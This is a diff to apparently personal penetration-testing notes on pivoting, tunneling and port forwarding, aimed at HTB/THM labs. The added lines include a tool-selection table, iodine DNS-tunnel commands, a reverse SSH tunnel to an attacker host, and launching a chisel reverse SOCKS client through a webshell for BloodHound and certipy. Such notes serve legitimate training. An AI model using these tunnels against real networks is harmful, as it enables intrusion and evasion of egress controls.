@@ -5,7 +5,7 @@ tags: [htb, lateral-movement, linux, network, pivoting, port-forwarding, thm, tu
 phase: post-exploitation
 date_created: 2026-05-08
 date_updated: 2026-09-10
-sources: [cpts-pivoting, thm-ad-lateral, InternalAllTheThings]
+sources: [cpts-pivoting, git-htb-writeups, thm-ad-lateral, InternalAllTheThings]
 ---
 
 # Pivoting, Tunneling & Port Forwarding
@@ -73,6 +73,21 @@ Comparison table showing platform support (Windows, Linux, macOS), available pol
 | ligolo-ng    |     ❌ |     ❌ |     ✅ |    ❌ |         ✅ |     ✅  |   ✅  |     ✅ |           ✅ |
 | gost         |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ✅ |
 | rpivot       |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
+
+### Tool Selection Quick Reference
+
+| Situation | Tool |
+|---|---|
+| SSH available on pivot (Linux/modern Windows) | `ssh -L / -R / -D` |
+| No SSH, socat available | `socat` relay |
+| Windows pre-2019 (no OpenSSH) | `plink.exe` |
+| Only HTTP/HTTPS outbound allowed | Chisel |
+| Only DNS outbound allowed | dnscat2 |
+| Need transparent routing (no proxychains) | Ligolo-ng |
+| Already have Meterpreter session | `autoroute` + `socks_proxy` or `portfwd` |
+| Need SOCKS on Windows without tools | `ssh tunneluser@attacker -R 9050 -N` |
+| Windows with admin rights, no extra tools | `netsh portproxy` |
+| Corporate NTLM proxy blocking egress | rpivot with NTLM support |
 
 ---
 
@@ -563,6 +578,22 @@ listen 127.0.0.1:8080 172.16.5.25:80   # port forward
 
 ---
 
+## iodine (DNS tunneling)
+
+```bash
+# ATTACKER — start server (requires DNS delegation for tunnel.domain.com)
+iodined -f -c -P password 10.0.0.1 tunnel.domain.com
+
+# PIVOT — connect client
+iodine -f -P password tunnel.domain.com
+# Creates tun0 interface on both ends; attacker is 10.0.0.1, pivot is 10.0.0.2
+
+# SSH through iodine tunnel
+ssh -D 1080 user@10.0.0.1
+```
+
+---
+
 ## Netsh (Windows Built-in Port Forward)
 
 Windows' built-in port proxy — no extra tools needed, requires Administrator:
@@ -668,6 +699,21 @@ Uncomment `proxy_dns` to also proxify DNS requests.
 proxychains nmap -sT 10.10.10.10
 proxychains curl http://10.10.10.10
 ```
+
+### SOCKS pivot toolkit gotchas (chisel + proxychains + AD tools)
+
+- Launching the chisel client when the only execution channel is a webshell/HTTP request: `start /b <chisel.exe> client <attacker>:8001 R:socks` returns immediately so the HTTP request does not hang; the reverse SOCKS listener binds on the attacker at 127.0.0.1:1080.
+- `/etc/proxychains.conf` is root-owned: copy it out and point proxychains at the copy.
+
+```sh
+cp /etc/proxychains.conf /tmp/pc.conf && sed -i 's/^socks.*/socks5 127.0.0.1 1080/' /tmp/pc.conf
+proxychains -f /tmp/pc.conf -q <tool> ...
+```
+
+- BloodHound collection through the tunnel needs `--dns-server <dc>` AND `--dns-tcp` or DC discovery fails with "Could not find a domain controller" (UDP DNS does not traverse the SOCKS stream).
+- certipy over the tunnel needs `-ldap-scheme ldap`: the LDAPS TLS handshake breaks over a chisel SOCKS stream. If the pip install lands no console script, run it as `python3 -c "from certipy.entry import main; main()"`.
+
+<!-- promoted-slug: socks-pivot-toolkit-gotchas -->
 
 ---
 
